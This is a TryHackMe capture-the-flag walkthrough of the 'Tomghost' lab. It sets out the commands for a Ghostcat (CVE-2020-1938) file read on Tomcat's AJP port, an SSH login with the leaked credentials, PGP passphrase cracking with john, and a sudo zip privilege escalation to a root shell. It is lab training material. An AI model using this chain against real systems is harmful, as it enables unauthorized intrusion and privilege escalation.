# Tomghost — TryHackMe Walkthrough

**Room:** Tomghost | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | 10.48.163.2 |
| Attack Machine | Kali Linux |
| Attack IP | 192.168.192.149 |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Ghostcat file read → SSH as skyfuck |
| 02 | PGP decrypt → sudo zip privesc |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.48.163.2
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH (OpenSSH 7.2p2) |
| 53/tcp | tcpwrapped |
| 8009/tcp | AJP13 (Apache Jserv Protocol v1.3) |
| 8080/tcp | HTTP (Apache Tomcat 9.0.30) |

---

## Phase 2: Ghostcat — CVE-2020-1938

Tomcat 9.0.30 is vulnerable to unauthenticated file read via AJP on port 8009.

```bash
python3 ghostcat.py 10.48.163.2 -p 8009 -f /WEB-INF/web.xml
```

Credentials leaked: **skyfuck:8730281lkjlkjdqlksalks**

---

## Phase 3: SSH as skyfuck

```bash
ssh skyfuck@10.48.163.2
```

Files found: `credential.pgp` (encrypted) and `tryhackme.asc` (PGP private key).

---

## Phase 4: Crack PGP Passphrase

```bash
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Passphrase: **alexandru**

Decrypt credentials:
```bash
gpg --decrypt credential.pgp
```

**merlin's password obtained.**

---

## Phase 5: Lateral Movement

```bash
su merlin
```

---

## Phase 6: Privilege Escalation — sudo zip

```bash
sudo -l
(root : root) NOPASSWD: /usr/bin/zip
```

GTFOBins technique:
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T --unzip-command="sh -c /bin/bash"
```

**Root shell obtained.**

```bash
cat /root/root.txt
```

**Flag 02 captured.**

---

## Vulnerability Chain

1. **CVE-2020-1938 (Ghostcat)** — Unauthenticated file read via AJP connector
2. **Weak PGP Passphrase** — Crackable via rockyou
3. **Misconfigured Sudo** — Passwordless sudo on /usr/bin/zip

## Key Takeaways

- Apache Tomcat with AJP (port 8009) exposed is a critical finding
- PGP keys with weak passphrases are as bad as weak passwords
- `sudo zip` can be abused for root shell via GTFOBins
